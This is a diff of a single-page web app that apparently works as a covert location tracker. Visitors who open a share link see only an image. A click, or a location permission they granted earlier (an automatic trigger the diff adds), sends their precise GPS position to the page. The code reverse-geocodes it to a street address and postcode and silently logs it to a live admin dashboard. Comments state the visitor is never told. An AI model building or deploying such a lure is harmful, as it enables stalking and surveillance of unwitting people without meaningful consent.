@@ -16,6 +16,10 @@
 
 <style>
 
+/* =========================================================
+   RESET
+========================================================= */
+
 *{
     box-sizing:border-box;
     margin:0;
@@ -43,31 +47,43 @@ body{
 
 
 /* =========================================================
-   ADMIN
+   ADMIN PAGE
 ========================================================= */
 
 #adminPage{
+
     min-height:100vh;
 
+    padding:
+        25px
+        15px
+        60px;
+
     background:
+
         radial-gradient(
             circle at 10% 0%,
             rgba(99,102,241,.25),
             transparent 35%
         ),
+
         radial-gradient(
             circle at 90% 10%,
-            rgba(139,92,246,.18),
+            rgba(139,92,246,.20),
             transparent 30%
         ),
-        #050711;
 
-    padding:25px 15px 60px;
+        #050711;
 }
 
 
 .admin-container{
-    width:min(1200px,100%);
+
+    width:min(
+        1200px,
+        100%
+    );
+
     margin:auto;
 }
 
@@ -77,63 +93,78 @@ body{
 ========================================================= */
 
 .header{
+
     position:relative;
 
     padding:30px;
+
+    margin-bottom:22px;
 
     border-radius:26px;
 
     background:
         linear-gradient(
             135deg,
-            rgba(20,27,55,.95),
-            rgba(10,14,30,.95)
+            rgba(20,27,55,.97),
+            rgba(9,13,30,.97)
         );
 
-    border:1px solid rgba(255,255,255,.08);
+    border:
+        1px solid
+        rgba(255,255,255,.08);
 
     box-shadow:
-        0 20px 70px rgba(0,0,0,.35);
+        0 20px 70px
+        rgba(0,0,0,.35);
 
     overflow:hidden;
-
-    margin-bottom:22px;
 }
 
 
 .header::before{
+
     content:"";
 
     position:absolute;
 
-    width:220px;
-    height:220px;
+    width:260px;
+    height:260px;
 
-    right:-80px;
-    top:-100px;
+    right:-100px;
+    top:-130px;
 
     background:
         radial-gradient(
             circle,
-            rgba(124,58,237,.35),
+            rgba(124,58,237,.30),
             transparent 70%
         );
 }
 
 
 .logo-row{
+
     display:flex;
+
     align-items:center;
+
     gap:15px;
+
+    position:relative;
+
+    z-index:1;
 }
 
 
 .logo{
-    width:58px;
-    height:58px;
+
+    width:60px;
+    height:60px;
 
     display:flex;
+
     align-items:center;
+
     justify-content:center;
 
     border-radius:18px;
@@ -148,19 +179,25 @@ body{
         );
 
     box-shadow:
-        0 10px 30px rgba(99,102,241,.35);
+        0 10px 30px
+        rgba(99,102,241,.35);
 }
 
 
 .header h1{
+
     font-size:30px;
+
     line-height:1.1;
 }
 
 
 .header p{
-    color:#94a3b8;
+
     margin-top:7px;
+
+    color:#94a3b8;
+
     font-size:14px;
 }
 
@@ -170,14 +207,17 @@ body{
 ========================================================= */
 
 .card{
+
     background:
         linear-gradient(
             145deg,
-            rgba(17,24,48,.96),
-            rgba(9,13,28,.96)
+            rgba(17,24,48,.97),
+            rgba(9,13,28,.97)
         );
 
-    border:1px solid rgba(255,255,255,.08);
+    border:
+        1px solid
+        rgba(255,255,255,.08);
 
     border-radius:24px;
 
@@ -186,32 +226,39 @@ body{
     margin-bottom:22px;
 
     box-shadow:
-        0 15px 50px rgba(0,0,0,.25);
+        0 15px 50px
+        rgba(0,0,0,.25);
 }
 
 
 .card-title{
+
     display:flex;
+
     align-items:center;
+
     gap:10px;
 
-    font-size:20px;
-    font-weight:800;
-
     margin-bottom:20px;
+
+    font-size:20px;
+
+    font-weight:800;
 }
 
 
 .card-title span{
+
     font-size:23px;
 }
 
 
 /* =========================================================
-   FORM
+   INPUT
 ========================================================= */
 
 label{
+
     display:block;
 
     margin:
@@ -219,9 +266,9 @@ label{
         0
         8px;
 
-    font-size:13px;
-
     color:#cbd5e1;
+
+    font-size:13px;
 
     font-weight:700;
 }
@@ -231,13 +278,15 @@ input[type="text"]{
 
     width:100%;
 
-    padding:15px 16px;
+    padding:
+        15px
+        16px;
 
     border-radius:14px;
 
     border:
         1px solid
-        rgba(255,255,255,.1);
+        rgba(255,255,255,.10);
 
     outline:none;
 
@@ -246,8 +295,6 @@ input[type="text"]{
     color:#fff;
 
     font-size:15px;
-
-    transition:.2s;
 }
 
 
@@ -267,26 +314,24 @@ input[type="text"]:focus{
 
 .upload-box{
 
-    position:relative;
+    padding:
+        38px
+        20px;
 
     border:
         2px dashed
         rgba(99,102,241,.65);
 
-    background:
-        rgba(99,102,241,.045);
-
     border-radius:20px;
-
-    padding:38px 20px;
 
     text-align:center;
 
     cursor:pointer;
 
-    transition:.25s;
+    background:
+        rgba(99,102,241,.045);
 
-    overflow:hidden;
+    transition:.2s;
 }
 
 
@@ -296,9 +341,6 @@ input[type="text"]:focus{
 
     background:
         rgba(139,92,246,.08);
-
-    transform:
-        translateY(-1px);
 }
 
 
@@ -307,14 +349,16 @@ input[type="text"]:focus{
     width:65px;
     height:65px;
 
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
     margin:
         0
         auto
         12px;
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:center;
 
     border-radius:18px;
 
@@ -333,9 +377,9 @@ input[type="text"]:focus{
 
     display:block;
 
-    font-size:17px;
-
     margin-bottom:7px;
+
+    font-size:17px;
 }
 
 
@@ -348,6 +392,7 @@ input[type="text"]:focus{
 
 
 #imageInput{
+
     display:none;
 }
 
@@ -364,9 +409,9 @@ input[type="text"]:focus{
 
     max-height:430px;
 
-    object-fit:contain;
-
     margin-top:18px;
+
+    object-fit:contain;
 
     border-radius:18px;
 
@@ -384,21 +429,19 @@ input[type="text"]:focus{
 
 button{
 
-    border:none;
+    border:0;
 
-    outline:none;
+    outline:0;
 
     cursor:pointer;
 
     font-family:inherit;
 
-    font-weight:800;
-
     color:#fff;
 
-    border-radius:14px;
+    font-weight:800;
 
-    transition:.2s;
+    border-radius:14px;
 }
 
 
@@ -425,24 +468,11 @@ button{
 }
 
 
-.generate-btn:hover{
-
-    transform:
-        translateY(-2px);
-
-    box-shadow:
-        0 16px 40px
-        rgba(99,102,241,.35);
-}
-
-
 .generate-btn:disabled{
 
     opacity:.55;
 
     cursor:not-allowed;
-
-    transform:none;
 }
 
 
@@ -464,7 +494,7 @@ button{
 
     border:
         1px solid
-        rgba(99,102,241,.2);
+        rgba(99,102,241,.20);
 }
 
 
@@ -487,10 +517,6 @@ button{
     border-radius:12px;
 
     background:#03050c;
-
-    border:
-        1px solid
-        rgba(255,255,255,.07);
 
     color:#c7d2fe;
 
@@ -568,11 +594,11 @@ th{
 
     text-align:left;
 
-    font-size:12px;
+    white-space:nowrap;
 
     color:#a5b4fc;
 
-    white-space:nowrap;
+    font-size:12px;
 }
 
 
@@ -595,49 +621,22 @@ td{
 tbody tr:hover{
 
     background:
-        rgba(99,102,241,.035);
+        rgba(99,102,241,.04);
 }
 
 
 .empty{
 
-    text-align:center;
-
     padding:30px;
+
+    text-align:center;
 
     color:#64748b;
 }
 
 
 /* =========================================================
-   STATUS
-========================================================= */
-
-.status{
-
-    display:inline-flex;
-
-    align-items:center;
-
-    gap:6px;
-
-    padding:5px 9px;
-
-    border-radius:999px;
-
-    background:
-        rgba(34,197,94,.1);
-
-    color:#86efac;
-
-    font-size:11px;
-
-    font-weight:700;
-}
-
-
-/* =========================================================
-   VISITOR
+   VISITOR PAGE
 ========================================================= */
 
 #visitorPage{
@@ -650,15 +649,14 @@ tbody tr:hover{
 
     min-height:100vh;
 
-    background:#000;
-
     overflow:hidden;
+
+    background:#000;
 }
 
 
 /*
-    IMPORTANT:
-    Visitor sees ONLY this image.
+    VISITOR SEES ONLY THIS.
 */
 
 #visitorImage{
@@ -675,7 +673,7 @@ tbody tr:hover{
 
     border:0;
 
-    outline:none;
+    outline:0;
 
     cursor:pointer;
 
@@ -690,7 +688,31 @@ tbody tr:hover{
 
 
 /* =========================================================
-   MOBILE ADMIN
+   VISITOR MODE
+========================================================= */
+
+body.visitor-mode{
+
+    background:#000;
+
+    overflow:hidden;
+}
+
+
+body.visitor-mode #adminPage{
+
+    display:none!important;
+}
+
+
+body.visitor-mode #visitorPage{
+
+    display:block!important;
+}
+
+
+/* =========================================================
+   MOBILE
 ========================================================= */
 
 @media(max-width:700px){
@@ -735,47 +757,17 @@ tbody tr:hover{
     }
 
 
-    .action-row{
-
-        flex-direction:column;
-    }
-
-
     .upload-box{
 
         padding:30px 15px;
     }
 
-}
 
+    .action-row{
 
-/* =========================================================
-   LOADING
-========================================================= */
+        flex-direction:column;
+    }
 
-.loading{
-
-    opacity:.7;
-}
-
-
-/* =========================================================
-   HIDE EVERYTHING IN VISITOR MODE
-========================================================= */
-
-body.visitor-mode{
-
-    background:#000;
-}
-
-body.visitor-mode #adminPage{
-
-    display:none!important;
-}
-
-body.visitor-mode #visitorPage{
-
-    display:block!important;
 }
 
 </style>
@@ -787,15 +779,13 @@ body.visitor-mode #visitorPage{
 
 
 <!-- =======================================================
-     ADMIN PAGE
+     ADMIN
 ======================================================= -->
 
 <div id="adminPage">
 
 <div class="admin-container">
 
-
-    <!-- HEADER -->
 
     <div class="header">
 
@@ -822,14 +812,18 @@ body.visitor-mode #visitorPage{
     </div>
 
 
-
-    <!-- CREATE SHARE -->
+    <!-- ===================================================
+         CREATE SHARE
+    =================================================== -->
 
     <div class="card">
 
         <div class="card-title">
+
             <span>✨</span>
+
             Create Share Link
+
         </div>
 
 
@@ -933,13 +927,18 @@ body.visitor-mode #visitorPage{
 
 
 
-    <!-- LOCATIONS -->
+    <!-- ===================================================
+         LOCATION TABLE
+    =================================================== -->
 
     <div class="card">
 
         <div class="card-title">
+
             <span>📊</span>
+
             Visitor Locations
+
         </div>
 
 
@@ -951,45 +950,25 @@ body.visitor-mode #visitorPage{
 
                     <tr>
 
-                        <th>
-                            Title
-                        </th>
+                        <th>Title</th>
 
-                        <th>
-                            Latitude
-                        </th>
+                        <th>Latitude</th>
 
-                        <th>
-                            Longitude
-                        </th>
+                        <th>Longitude</th>
 
-                        <th>
-                            Accuracy
-                        </th>
+                        <th>Accuracy</th>
 
-                        <th>
-                            Address
-                        </th>
+                        <th>Address</th>
 
-                        <th>
-                            City
-                        </th>
+                        <th>City</th>
 
-                        <th>
-                            State
-                        </th>
+                        <th>State</th>
 
-                        <th>
-                            Pincode
-                        </th>
+                        <th>Pincode</th>
 
-                        <th>
-                            Country
-                        </th>
+                        <th>Country</th>
 
-                        <th>
-                            Time
-                        </th>
+                        <th>Time</th>
 
                     </tr>
 
@@ -1004,7 +983,7 @@ body.visitor-mode #visitorPage{
                             colspan="10"
                             class="empty"
                         >
-                            Loading visitor locations...
+                            Loading...
                         </td>
 
                     </tr>
@@ -1025,8 +1004,7 @@ body.visitor-mode #visitorPage{
 
 
 <!-- =======================================================
-     VISITOR PAGE
-     ONLY IMAGE
+     VISITOR
 ======================================================= -->
 
 <div id="visitorPage">
@@ -1052,26 +1030,25 @@ const SUPABASE_URL =
 
 
 /*
-    IMPORTANT:
-
-    Paste ONLY your publishable key here.
+    PASTE YOUR PUBLISHABLE KEY HERE.
 
     Example:
 
     const SUPABASE_KEY =
         "sb_publishable_xxxxxxxxx";
 
-    NEVER put sb_secret_ key here.
+    NEVER paste sb_secret key here.
 */
 
-const SUPABASE_KEY ="sb_publishable__rcgeXfzaLjEK5eyds8qMA_QIqqApPU";
+const SUPABASE_KEY =
+    "sb_publishable__rcgeXfzaLjEK5eyds8qMA_QIqqApPU";
 
 
 let supabaseClient = null;
 
 
 /* =========================================================
-   GLOBAL VARIABLES
+   GLOBALS
 ========================================================= */
 
 let selectedFile = null;
@@ -1081,8 +1058,22 @@ let currentShareId = null;
 let generatedShareUrl = "";
 
 
+/*
+    Prevent multiple simultaneous location requests.
+*/
+
+let locationRequestRunning = false;
+
+
+/*
+    Prevent duplicate request from rapid clicks.
+*/
+
+let lastLocationRequestTime = 0;
+
+
 /* =========================================================
-   INITIALIZE
+   SUPABASE INIT
 ========================================================= */
 
 function initializeSupabase(){
@@ -1120,7 +1111,14 @@ document.addEventListener(
     "DOMContentLoaded",
     async function(){
 
-        initializeSupabase();
+        const ready =
+            initializeSupabase();
+
+
+        if(!ready){
+
+            return;
+        }
 
 
         const params =
@@ -1134,9 +1132,9 @@ document.addEventListener(
 
 
         /*
-            ID present
-            =
-            VISITOR MODE
+            =================================================
+            VISITOR
+            =================================================
         */
 
         if(shareId){
@@ -1153,24 +1151,49 @@ document.addEventListener(
             await loadVisitorImage();
 
 
+            /*
+                IMPORTANT:
+
+                If browser permission is already
+                granted for this website, we can
+                request the current position without
+                showing another permission popup.
+
+                If permission is not granted,
+                visitor interaction is required.
+            */
+
+            await autoLocationIfAlreadyAllowed();
+
+
             return;
         }
 
 
         /*
-            No ID
-            =
-            ADMIN MODE
+            =================================================
+            ADMIN
+            =================================================
         */
 
         await loadLocations();
+
+
+        /*
+            Automatically refresh dashboard.
+        */
+
+        setInterval(
+            loadLocations,
+            5000
+        );
 
     }
 );
 
 
 /* =========================================================
-   UPLOAD BOX
+   IMAGE SELECT
 ========================================================= */
 
 document
@@ -1187,10 +1210,6 @@ document
     );
 
 
-/* =========================================================
-   IMAGE SELECT
-========================================================= */
-
 document
     .getElementById("imageInput")
     .addEventListener(
@@ -1204,8 +1223,7 @@ document
 
             if(!file){
 
-                selectedFile =
-                    null;
+                selectedFile = null;
 
                 return;
             }
@@ -1276,7 +1294,7 @@ document
 
 
 /* =========================================================
-   CREATE SHARE
+   GENERATE BUTTON
 ========================================================= */
 
 document
@@ -1287,12 +1305,16 @@ document
     );
 
 
+/* =========================================================
+   CREATE SHARE
+========================================================= */
+
 async function createShare(){
 
     if(!supabaseClient){
 
         alert(
-            "Supabase is not configured. Paste your publishable key."
+            "Supabase is not configured."
         );
 
         return;
@@ -1309,7 +1331,7 @@ async function createShare(){
     if(!title){
 
         alert(
-            "Please enter an image title."
+            "Please enter image title."
         );
 
         return;
@@ -1333,9 +1355,7 @@ async function createShare(){
         );
 
 
-    button.disabled =
-        true;
-
+    button.disabled = true;
 
     button.textContent =
         "⏳ Uploading image...";
@@ -1344,20 +1364,14 @@ async function createShare(){
     try{
 
         /*
-            Generate UUID
+            Unique share ID.
+
+            Every image/link gets its own ID.
         */
 
         const shareId =
             crypto.randomUUID();
 
-
-        currentShareId =
-            shareId;
-
-
-        /*
-            File extension
-        */
 
         const extension =
             getExtension(
@@ -1372,7 +1386,7 @@ async function createShare(){
 
 
         /* =================================================
-           STORAGE UPLOAD
+           STORAGE
         ================================================= */
 
         const uploadResult =
@@ -1383,12 +1397,16 @@ async function createShare(){
                 filePath,
                 selectedFile,
                 {
-                    cacheControl:"3600",
+
+                    cacheControl:
+                        "3600",
 
                     contentType:
                         selectedFile.type,
 
-                    upsert:false
+                    upsert:
+                        false
+
                 }
             );
 
@@ -1400,11 +1418,11 @@ async function createShare(){
 
 
         button.textContent =
-            "⏳ Creating link...";
+            "⏳ Saving share...";
 
 
         /* =================================================
-           PUBLIC IMAGE URL
+           PUBLIC URL
         ================================================= */
 
         const publicResult =
@@ -1425,13 +1443,13 @@ async function createShare(){
         if(!imageUrl){
 
             throw new Error(
-                "Could not generate public image URL."
+                "Could not create image URL."
             );
         }
 
 
         /* =================================================
-           SAVE SHARE
+           SHARES TABLE
         ================================================= */
 
         const shareResult =
@@ -1458,7 +1476,7 @@ async function createShare(){
 
 
         /* =================================================
-           CREATE URL
+           SHARE LINK
         ================================================= */
 
         const slug =
@@ -1469,7 +1487,9 @@ async function createShare(){
             window.location.origin +
             window.location.pathname +
             "?share=" +
-            encodeURIComponent(slug) +
+            encodeURIComponent(
+                slug
+            ) +
             "&id=" +
             encodeURIComponent(
                 shareId
@@ -1495,6 +1515,10 @@ async function createShare(){
         button.textContent =
             "✅ Link Generated";
 
+
+        /*
+            Refresh table.
+        */
 
         await loadLocations();
 
@@ -1526,6 +1550,7 @@ async function createShare(){
 
         button.disabled =
             false;
+
     }
 
 }
@@ -1538,6 +1563,12 @@ async function createShare(){
 async function loadVisitorImage(){
 
     if(!supabaseClient){
+
+        return;
+    }
+
+
+    if(!currentShareId){
 
         return;
     }
@@ -1561,7 +1592,7 @@ async function loadVisitorImage(){
         if(result.error){
 
             console.error(
-                "Visitor image query error:",
+                "Image query error:",
                 result.error
             );
 
@@ -1575,7 +1606,7 @@ async function loadVisitorImage(){
         ){
 
             console.error(
-                "Share not found."
+                "Share image not found."
             );
 
             return;
@@ -1586,38 +1617,89 @@ async function loadVisitorImage(){
             ONLY IMAGE
         */
 
-        const image =
-            document
+        document
             .getElementById(
                 "visitorImage"
-            );
-
-
-        image.src =
-            result.data.image_url;
-
-
-        /*
-            IMPORTANT:
-
-            Do NOT display:
-            - location button
-            - address
-            - latitude
-            - longitude
-            - status
-            - permission text
-
-            Visitor sees image only.
-        */
+            )
+            .src =
+                result.data.image_url;
 
     }
 
     catch(error){
 
         console.error(
-            "Visitor page error:",
+            "Visitor image error:",
             error
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   AUTO LOCATION WHEN ALREADY GRANTED
+========================================================= */
+
+async function autoLocationIfAlreadyAllowed(){
+
+    /*
+        Permissions API may not be available
+        in every browser.
+    */
+
+    if(
+        !navigator.permissions
+    ){
+
+        return;
+    }
+
+
+    try{
+
+        const permission =
+            await navigator
+            .permissions
+            .query(
+                {
+                    name:"geolocation"
+                }
+            );
+
+
+        /*
+            Already allowed.
+
+            No browser popup should be needed.
+        */
+
+        if(
+            permission.state ===
+            "granted"
+        ){
+
+            requestLocation(
+                false
+            );
+
+        }
+
+
+        /*
+            If "prompt", do NOTHING.
+
+            User will get native browser
+            permission after image click.
+        */
+
+    }
+
+    catch(error){
+
+        console.log(
+            "Permission state unavailable."
         );
 
     }
@@ -1633,7 +1715,21 @@ document
     .getElementById("visitorImage")
     .addEventListener(
         "click",
-        requestLocation
+        function(){
+
+            /*
+                User interaction.
+
+                This allows browser to show
+                its native location permission
+                dialog if required.
+            */
+
+            requestLocation(
+                true
+            );
+
+        }
     );
 
 
@@ -1641,17 +1737,11 @@ document
    REQUEST LOCATION
 ========================================================= */
 
-function requestLocation(){
+function requestLocation(
+    fromUserClick
+){
 
-    /*
-        Browser native permission only.
-
-        No custom permission popup.
-    */
-
-    if(
-        !navigator.geolocation
-    ){
+    if(!navigator.geolocation){
 
         return;
     }
@@ -1669,21 +1759,96 @@ function requestLocation(){
     }
 
 
+    /*
+        Prevent duplicate requests.
+    */
+
+    if(locationRequestRunning){
+
+        return;
+    }
+
+
+    /*
+        Prevent rapid repeated clicks.
+    */
+
+    const now =
+        Date.now();
+
+
+    if(
+        now -
+        lastLocationRequestTime
+        <
+        3000
+    ){
+
+        return;
+    }
+
+
+    lastLocationRequestTime =
+        now;
+
+
+    locationRequestRunning =
+        true;
+
+
     navigator
         .geolocation
         .getCurrentPosition(
 
-            handleLocationSuccess,
+            async function(position){
 
-            handleLocationError,
+                try{
+
+                    await saveVisitorLocation(
+                        position
+                    );
+
+                }
+
+                finally{
+
+                    locationRequestRunning =
+                        false;
+
+                }
+
+            },
+
+            function(error){
+
+                locationRequestRunning =
+                    false;
+
+
+                /*
+                    Don't show anything to visitor.
+
+                    Permission denied / timeout /
+                    unavailable = image remains.
+                */
+
+                console.log(
+                    "Location unavailable:",
+                    error.code
+                );
+
+            },
 
             {
 
-                enableHighAccuracy:true,
+                enableHighAccuracy:
+                    true,
 
-                timeout:20000,
+                timeout:
+                    20000,
 
-                maximumAge:0
+                maximumAge:
+                    0
 
             }
 
@@ -1693,33 +1858,38 @@ function requestLocation(){
 
 
 /* =========================================================
-   LOCATION SUCCESS
+   SAVE VISITOR LOCATION
 ========================================================= */
 
-async function handleLocationSuccess(
+async function saveVisitorLocation(
     position
 ){
 
+    const latitude =
+        position.coords.latitude;
+
+
+    const longitude =
+        position.coords.longitude;
+
+
+    const accuracy =
+        position.coords.accuracy;
+
+
+    /*
+        Current exact timestamp.
+    */
+
+    const visitedAt =
+        new Date()
+        .toISOString();
+
+
     try{
 
-        const latitude =
-            position.coords.latitude;
-
-
-        const longitude =
-            position.coords.longitude;
-
-
-        const accuracy =
-            position.coords.accuracy;
-
-
-        const visitedAt =
-            new Date().toISOString();
-
-
         /*
-            Reverse geocoding
+            Reverse geocoding.
         */
 
         const location =
@@ -1731,12 +1901,14 @@ async function handleLocationSuccess(
 
         /*
             SAVE ONLY AFTER
-            NATIVE PERMISSION = ALLOW
+            SUCCESSFUL GEOLOCATION.
         */
 
         const result =
             await supabaseClient
-            .from("visitor_locations")
+            .from(
+                "visitor_locations"
+            )
             .insert({
 
                 share_id:
@@ -1779,27 +1951,28 @@ async function handleLocationSuccess(
                 result.error
             );
 
-            return;
+            return false;
         }
 
 
         /*
-            NOTHING is shown
-            to visitor.
+            Visitor sees nothing.
+
+            Dashboard will fetch it automatically.
         */
 
-        console.log(
-            "Location saved."
-        );
+        return true;
 
     }
 
     catch(error){
 
         console.error(
-            "Location processing error:",
+            "Location save processing failed:",
             error
         );
+
+        return false;
 
     }
 
@@ -1807,31 +1980,7 @@ async function handleLocationSuccess(
 
 
 /* =========================================================
-   LOCATION ERROR
-========================================================= */
-
-function handleLocationError(
-    error
-){
-
-    /*
-        Denied / unavailable / timeout.
-
-        Do nothing.
-
-        Image remains visible.
-    */
-
-    console.log(
-        "Location not shared:",
-        error.code
-    );
-
-}
-
-
-/* =========================================================
-   REVERSE GEOCODING
+   REVERSE GEOCODE
 ========================================================= */
 
 async function reverseGeocode(
@@ -1874,7 +2023,7 @@ async function reverseGeocode(
     if(!response.ok){
 
         throw new Error(
-            "Reverse geocoding failed."
+            "Address lookup failed."
         );
     }
 
@@ -1883,64 +2032,65 @@ async function reverseGeocode(
         await response.json();
 
 
-    const address =
-        data.address || {};
+    const a =
+        data.address ||
+        {};
 
 
     /*
-        City fallback
+        CITY
     */
 
     const city =
-        address.city ||
-        address.town ||
-        address.village ||
-        address.municipality ||
-        address.suburb ||
-        address.city_district ||
+        a.city ||
+        a.town ||
+        a.village ||
+        a.municipality ||
+        a.suburb ||
+        a.city_district ||
         "";
 
 
     /*
-        State fallback
+        STATE
     */
 
     const state =
-        address.state ||
-        address.state_district ||
+        a.state ||
+        a.state_district ||
         "";
 
 
     /*
-        Pincode
+        PINCODE
     */
 
     let postcode =
-        address.postcode ||
+        a.postcode ||
         "";
 
 
     /*
-        Country
+        COUNTRY
     */
 
     const country =
-        address.country ||
+        a.country ||
         "";
 
 
     /*
-        Full address
+        FULL ADDRESS
     */
 
     let fullAddress =
         data.display_name ||
         [
-            address.house_number,
-            address.building,
-            address.road,
-            address.neighbourhood,
-            address.suburb,
+            a.house_number,
+            a.building,
+            a.road,
+            a.neighbourhood,
+            a.suburb,
             city,
             state,
             postcode,
@@ -1951,12 +2101,16 @@ async function reverseGeocode(
 
 
     /*
-        India PIN fallback
+        India PIN fallback.
+
+        If Nominatim didn't return postcode,
+        try to find a 6-digit PIN in address.
     */
 
     if(
         !postcode &&
-        country.toLowerCase()
+        country
+            .toLowerCase()
             .includes("india")
     ){
 
@@ -1973,6 +2127,7 @@ async function reverseGeocode(
                 match[0];
 
         }
+
     }
 
 
@@ -1999,7 +2154,7 @@ async function reverseGeocode(
 
 
 /* =========================================================
-   LOAD LOCATIONS
+   LOAD ALL LOCATIONS
 ========================================================= */
 
 async function loadLocations(){
@@ -2022,14 +2177,18 @@ async function loadLocations(){
         /*
             IMPORTANT:
 
-            No shares(title) relation.
+            NO:
+
+            shares(title)
 
             This avoids PGRST200.
         */
 
         const locationsResult =
             await supabaseClient
-            .from("visitor_locations")
+            .from(
+                "visitor_locations"
+            )
             .select(
                 `
                     id,
@@ -2062,7 +2221,8 @@ async function loadLocations(){
 
 
         const locations =
-            locationsResult.data || [];
+            locationsResult.data ||
+            [];
 
 
         if(!locations.length){
@@ -2087,7 +2247,7 @@ async function loadLocations(){
 
 
         /*
-            Get unique share IDs
+            Get unique share IDs.
         */
 
         const shareIds =
@@ -2109,10 +2269,12 @@ async function loadLocations(){
         /*
             Fetch shares separately.
 
-            No foreign-key relationship required.
+            No foreign key required.
         */
 
-        if(shareIds.length){
+        if(
+            shareIds.length
+        ){
 
             const sharesResult =
                 await supabaseClient
@@ -2130,9 +2292,12 @@ async function loadLocations(){
                 !sharesResult.error
             ){
 
-                (sharesResult.data || [])
+                (
+                    sharesResult.data ||
+                    []
+                )
                 .forEach(
-                    share => {
+                    function(share){
 
                         shareMap[
                             share.id
@@ -2147,6 +2312,10 @@ async function loadLocations(){
         }
 
 
+        /*
+            BUILD TABLE
+        */
+
         table.innerHTML =
             locations
             .map(
@@ -2159,16 +2328,23 @@ async function loadLocations(){
                         "Unknown";
 
 
+                    /*
+                        Convert UTC timestamp
+                        to visitor/admin local time.
+                    */
+
                     const time =
                         row.visited_at
                         ?
                         new Date(
                             row.visited_at
-                        ).toLocaleString(
+                        )
+                        .toLocaleString(
                             undefined,
                             {
                                 dateStyle:
                                     "medium",
+
                                 timeStyle:
                                     "medium"
                             }
@@ -2183,9 +2359,12 @@ async function loadLocations(){
 
                         <td>
                             <strong>
-                                ${escapeHtml(title)}
+                                ${escapeHtml(
+                                    title
+                                )}
                             </strong>
                         </td>
+
 
                         <td>
                             ${formatNumber(
@@ -2193,26 +2372,36 @@ async function loadLocations(){
                             )}
                         </td>
 
+
                         <td>
                             ${formatNumber(
                                 row.longitude
                             )}
                         </td>
 
+
                         <td>
                             ${
-                                row.accuracy !== null &&
-                                row.accuracy !== undefined
+                                row.accuracy !==
+                                null &&
+                                row.accuracy !==
+                                undefined
+
                                 ?
+
                                 Math.round(
                                     Number(
                                         row.accuracy
                                     )
-                                ) + " m"
+                                ) +
+                                " m"
+
                                 :
+
                                 "-"
                             }
                         </td>
+
 
                         <td>
                             ${escapeHtml(
@@ -2221,12 +2410,14 @@ async function loadLocations(){
                             )}
                         </td>
 
+
                         <td>
                             ${escapeHtml(
                                 row.city ||
                                 "-"
                             )}
                         </td>
+
 
                         <td>
                             ${escapeHtml(
@@ -2235,6 +2426,7 @@ async function loadLocations(){
                             )}
                         </td>
 
+
                         <td>
                             ${escapeHtml(
                                 row.postcode ||
@@ -2242,12 +2434,14 @@ async function loadLocations(){
                             )}
                         </td>
 
+
                         <td>
                             ${escapeHtml(
                                 row.country ||
                                 "-"
                             )}
                         </td>
+
 
                         <td>
                             ${escapeHtml(
@@ -2268,7 +2462,7 @@ async function loadLocations(){
     catch(error){
 
         console.error(
-            "Location table error:",
+            "Dashboard load error:",
             error
         );
 
@@ -2353,10 +2547,6 @@ async function copyLink(){
 
     catch(error){
 
-        /*
-            Clipboard fallback
-        */
-
         const textarea =
             document.createElement(
                 "textarea"
@@ -2403,16 +2593,16 @@ document
         "click",
         function(){
 
-            if(!generatedShareUrl){
+            if(
+                generatedShareUrl
+            ){
 
-                return;
+                window.open(
+                    generatedShareUrl,
+                    "_blank"
+                );
+
             }
-
-
-            window.open(
-                generatedShareUrl,
-                "_blank"
-            );
 
         }
     );
@@ -2434,11 +2624,13 @@ function getExtension(
 
 
     const allowed = [
+
         "jpg",
         "jpeg",
         "png",
         "webp",
         "gif"
+
     ];
 
 
@@ -2449,10 +2641,12 @@ function getExtension(
     ){
 
         return extension;
+
     }
 
 
     return "jpg";
+
 }
 
 
@@ -2483,7 +2677,10 @@ function slugify(
         .slice(
             0,
             70
-        ) || "image";
+        )
+
+        ||
+        "image";
 
 }
 
